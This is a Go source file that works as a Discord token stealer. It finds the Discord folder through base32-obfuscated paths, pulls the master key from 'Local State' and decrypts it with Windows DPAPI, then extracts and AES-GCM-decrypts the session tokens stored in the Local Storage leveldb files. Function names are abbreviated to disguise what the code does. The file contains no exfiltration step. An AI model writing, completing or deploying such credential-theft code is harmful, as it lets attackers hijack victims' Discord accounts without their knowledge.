package Gbre

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base32"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"regexp"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

type JsonKeyFile struct {
	Crypt OSCrypt `json:"os_crypt"`
}

type OSCrypt struct {
	EncryptedKey string `json:"encrypted_key"`
}

func get_comp_name() string {
	name, _ := os.LookupEnv("USERNAME")

	return name
}

func confirme_dsc(basePath string) bool {
	//supposed architecture of the path
	//C:\Users\%username%\AppData\Local\dsc
	// dsc :
	// 	- app-*
	// 	- packages
	// 	- app.ico

	//try if the architecture is correct
	//list file

	coerance_score := 0

	var architectures = []string{"app-*", "packages", "app.ico"}

	files, _ := os.ReadDir(basePath)
	for _, file := range files {
		for _, architecture := range architectures {
			if file.Name() == architecture {
				coerance_score++
			}
			if strings.Contains(architecture, "*") {
				if strings.Contains(file.Name(), strings.ReplaceAll(architecture, "*", "")) {
					coerance_score++
				}
			}
		}

	}

	return coerance_score == len(architectures)
}

func find_dsc_path() string {
	name := get_comp_name()
	baseB32 := `IM5FYVLTMVZHGXA=`
	lateB32 := `LRAXA4CEMF2GCXCMN5RWC3C4IRUXGY3POJSA====`
	//decode base 32
	baseRaw, _ := base32.StdEncoding.DecodeString(baseB32)
	lateRaw, _ := base32.StdEncoding.DecodeString(lateB32)
	//convert to string
	baseString := string(baseRaw)
	lateString := string(lateRaw)
	basePath := baseString + name + lateString
	//try if the path exists
	//if it does, return the path
	if _, err := os.Stat(basePath); err == nil {
		// fmt.Println("Base Path Exists: ", basePath)
		if confirme_dsc(basePath) {
			return basePath
		}
	}
	return ""
}

func bytesToBlob(bytes []byte) *windows.DataBlob {
	blob := &windows.DataBlob{Size: uint32(len(bytes))}
	if len(bytes) > 0 {
		blob.Data = &bytes[0]
	}
	return blob
}

func Decrypt(data []byte) ([]byte, error) {

	out := windows.DataBlob{}
	var outName *uint16

	err := windows.CryptUnprotectData(bytesToBlob(data), &outName, nil, 0, nil, 0, &out)
	if err != nil {
		return nil, fmt.Errorf("unable to decrypt DPAPI protected data: %w", err)
	}
	ret := make([]byte, out.Size)
	copy(ret, unsafe.Slice(out.Data, out.Size))

	windows.LocalFree(windows.Handle(unsafe.Pointer(out.Data)))
	windows.LocalFree(windows.Handle(unsafe.Pointer(outName)))

	return ret, nil
}

func getMasterKey() ([]byte, error) {

	ENDPATH := `F5CGS43DN5ZGIL2MN5RWC3BAKN2GC5DF`
	//decode base 32
	ENDPATHRAW, _ := base32.StdEncoding.DecodeString(ENDPATH)
	//convert to string
	ENDPATHSTRING := string(ENDPATHRAW)

	jsonFile := os.Getenv("APPDATA") + ENDPATHSTRING

	byteValue, err := os.ReadFile(jsonFile)
	if err != nil {
		return nil, fmt.Errorf("could not read json file")
	}

	var fileData JsonKeyFile
	err = json.Unmarshal(byteValue, &fileData)
	if err != nil {
		return nil, fmt.Errorf("could not parse json")
	}

	baseEncryptedKey := fileData.Crypt.EncryptedKey
	encryptedKey, e := base64.StdEncoding.DecodeString(baseEncryptedKey)
	if e != nil {
		return nil, fmt.Errorf("could not decode base64")
	}
	encryptedKey = encryptedKey[5:]

	key, err := Decrypt(encryptedKey)
	if err != nil {
		return nil, fmt.Errorf("cryptunprotectdata decryption Failed ")
	}

	return key, nil
}

func decrypttkn(buffer []byte) (string, error) {

	iv := buffer[3:15]
	payload := buffer[15:]

	key, err := getMasterKey()
	if err != nil {
		return "", err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	ivSize := len(iv)
	if len(payload) < ivSize {
		return "", fmt.Errorf("incorrect iv, iv is too big")
	}

	plaintext, err := aesGCM.Open(nil, iv, payload, nil)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

func Find_dsc_tkn() []string {
	path := find_dsc_path()
	if path != "" {
		path = strings.Replace(path, "Local", "Roaming", 1)
		path += `\Local Storage\leveldb`
		files, _ := os.ReadDir(path)
		tkns := []string{}
		ProtectedTkns := [][]byte{}
		//create regex
		regex := regexp.MustCompile(`dQw4w9WgXcQ:[^\"]*`)
		for _, file := range files {
			if strings.Contains(file.Name(), "ldb") {
				//open file
				text, err := ioutil.ReadFile(path + "\\" + file.Name())
				if err != nil {
					panic(err)
				}
				//find multiple matches
				if regex.Match(text) {
					tknProtected := regex.FindAllString(string(text), -1)[0]
					tknProtected = strings.SplitAfterN(string(tknProtected), "dQw4w9WgXcQ:", 2)[1]
					encryptedtkn, _ := base64.StdEncoding.DecodeString(tknProtected)
					ProtectedTkns = append(ProtectedTkns, encryptedtkn)

				}
				for _, tkn := range ProtectedTkns {
					decrypted, err := decrypttkn(tkn)
					if err != nil {
						fmt.Println(err)
					}
					tkns = append(tkns, decrypted)
				}

			}
		}

		if len(tkns) > 0 {
			return tkns
		}
	}
	fmt.Println("dsc not found")

	return []string{}
}
